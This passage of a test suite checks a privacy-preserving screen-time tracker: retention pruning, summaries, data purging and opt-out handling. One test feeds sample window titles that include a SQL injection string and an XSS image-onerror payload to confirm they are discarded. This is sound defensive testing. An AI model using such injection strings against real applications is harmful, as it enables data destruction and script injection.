          app_name: "code.exe",
          duration_secs: 100,
          timestamp: NOW - 95 * 86400 - i * 60
        });
      }
      // 3 records from 45 days ago (<=90d cutoff)
      for (let i = 0; i < 3; i++) {
        engine.recordSession({
          app_name: "code.exe",
          duration_secs: 100,
          timestamp: NOW - 45 * 86400 - i * 60
        });
      }
      expect(engine.getSessionCount()).toBe(12); // 4 today + 5 old + 3 recent

      // ------------------------------------------------------------------------
      // Step 7: Execute 90-Day Retention Pruner
      // ------------------------------------------------------------------------
      const prunerRes = await ipc.invoke("productivity.screentime.prune_retention", {
        now_epoch: NOW,
        days: 90
      });
      expect(prunerRes.pruned_count).toBe(5); // Exactly 5 records older than 90d pruned
      expect(engine.getSessionCount()).toBe(7); // 4 today + 3 from 45d ago remain

      // ------------------------------------------------------------------------
      // Step 8: Query Dashboard Summary & 7-Day Trend
      // ------------------------------------------------------------------------
      const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
      expect(summary.total_secs).toBe(5400); // 2700 + 900 + 600 + 1200
      expect(summary.categories.belajar).toBe(3600); // 2700 + 900
      expect(summary.categories.netral).toBe(600);
      expect(summary.categories.pengalih).toBe(1200);

      // Category percentages
      expect(summary.category_percentages.belajar).toBe(67); // 3600 / 5400 = 66.67% -> 67%
      expect(summary.category_percentages.netral).toBe(11); // 600 / 5400 = 11.11% -> 11%
      expect(summary.category_percentages.pengalih).toBe(22); // 1200 / 5400 = 22.22% -> 22%

      // 7-day trend
      const trend = await ipc.invoke("productivity.screentime.get_7day_trend", { end_date: "2025-11-21" });
      expect(trend.length).toBe(7);
      expect(trend[6].total_secs).toBe(5400);

      // ------------------------------------------------------------------------
      // Step 9: User triggers One-Click Purge ("Hapus Data")
      // ------------------------------------------------------------------------
      // Insert mock enforcement history event to verify linked wipe
      db.run(`INSERT INTO enforcement_history VALUES ('enf-s7', ${NOW}, 'steam.exe', 'paksa', 'warned', 'test')`);

      const purgeResult = await ipc.invoke("productivity.screentime.clear_all");
      expect(purgeResult.deleted_rows).toBe(7); // All 7 remaining sessions purged
      expect(purgeResult.vacuumed).toBe(true);

      // Verify zero rows in database
      expect(engine.getSessionCount()).toBe(0);
      const remainingEnforcement = (db.query(`SELECT COUNT(*) as c FROM enforcement_history`).get() as any).c;
      expect(remainingEnforcement).toBe(0);

      // Verify dashboard summary returns clean empty state
      const clearedSummary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
      expect(clearedSummary.total_secs).toBe(0);
      expect(clearedSummary.top_apps).toEqual([]);

      // ------------------------------------------------------------------------
      // Step 10: Toggle opt-in off & verify zero subsequent writes
      // ------------------------------------------------------------------------
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: false });
      const postOptOut = await ipc.invoke("productivity.screentime.record", {
        app_name: "code.exe",
        duration_secs: 300,
        timestamp: NOW + 100
      });
      expect(postOptOut.recorded).toBe(false);
      expect(engine.getSessionCount()).toBe(0);
    });

    test("S7-02: Privacy Purge with Injected Malicious Payloads: 0 bytes of sensitive text survive in database", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });

      const dangerousTitles = [
        "Confidential Passwords 2026.txt - Notepad",
        "https://bank.com/transfer?pin=1234&account=9999",
        "Robert'); DROP TABLE screen_time_sessions;--",
        "<img src=x onerror=alert('hacked')>",
        "\x00\x1f\x7f Sensitive Binary Memory Dump"
      ];

      for (let i = 0; i < dangerousTitles.length; i++) {
        await ipc.invoke("productivity.screentime.record", {
          app_name: "code.exe",
          window_title: dangerousTitles[i],
          duration_secs: 60,
          timestamp: 1763726400 + i * 100
        });
      }

      // Check all sessions in SQLite: window_title column is strictly NULL
      const rows = db.query(`SELECT window_title FROM screen_time_sessions`).all() as any[];
      expect(rows.length).toBe(dangerousTitles.length);
      for (const r of rows) {
        expect(r.window_title).toBeNull();
      }

      // Execute purge and vacuum
      const purgeRes = await ipc.invoke("productivity.screentime.clear_all");
      expect(purgeRes.deleted_rows).toBe(dangerousTitles.length);
      expect(purgeRes.vacuumed).toBe(true);

      // After purge: zero rows exist
      expect(engine.getSessionCount()).toBe(0);
    });

    test("S7-03: Asymmetric Opt-in Reversal Lifecycle: Dropped sessions during opt-out leave zero trace", async () => {
      // 1. Opt-in -> Record 3 sessions
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      for (let i = 0; i < 3; i++) {
        await ipc.invoke("productivity.screentime.record", { app_name: "code.exe", duration_secs: 100 });
      }
      expect(engine.getSessionCount()).toBe(3);

      // 2. Opt-out -> Attempt to record 5 sessions
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: false });
      for (let i = 0; i < 5; i++) {
        const attempt = await ipc.invoke("productivity.screentime.record", { app_name: "steam.exe", duration_secs: 100 });
        expect(attempt.recorded).toBe(false);
      }
      expect(engine.getSessionCount()).toBe(3); // Count unmodified

      // 3. Opt-in again -> Record 2 sessions
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      for (let i = 0; i < 2; i++) {
        await ipc.invoke("productivity.screentime.record", { app_name: "obsidian.exe", duration_secs: 100 });
      }
      expect(engine.getSessionCount()).toBe(5); // 3 original + 2 new = 5 total
    });

    test("S7-04: Multi-Week Continuous Usage: 90-day pruner maintains exact 90-day rolling window", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      const NOW = 1763726400; // Reference date: 2025-11-21
      const DAY = 86400;

      // Seed 1 session per day for 120 days into the past (Day 0 down to Day -119)
      const insertStmt = db.prepare(`
        INSERT INTO screen_time_sessions (id, app_name, window_title, category, duration_secs, timestamp, date_str)
        VALUES (?, ?, NULL, ?, ?, ?, ?)
      `);

      const tx = db.transaction(() => {
        for (let day = 0; day < 120; day++) {
          const ts = NOW - day * DAY;
          const dateStr = PrivacyScrubbingEngine.epochToDateStr(ts);
          insertStmt.run(`st-hist-${day}`, "code.exe", "belajar", 1800, ts, dateStr);
        }
      });
      tx();

      expect(engine.getSessionCount()).toBe(120);

      // Execute 90-day pruner
      // Records from day 90 to 119 (30 days total) are older than cutoff (NOW - 90 * 86400)
      const pruneRes = await ipc.invoke("productivity.screentime.prune_retention", {
        now_epoch: NOW,
        days: 90
      });

      expect(pruneRes.pruned_count).toBe(29); // Day 91 to 119 = 29 records strictly older than cutoff
      expect(engine.getSessionCount()).toBe(91); // Day 0 to 90 = 91 records preserved

      // Trend still shows latest 7 days accurately
      const trend = await ipc.invoke("productivity.screentime.get_7day_trend", { end_date: "2025-11-21" });
      expect(trend.length).toBe(7);
      for (const day of trend) {
        expect(day.total_secs).toBe(1800);
      }
    });
  });
});
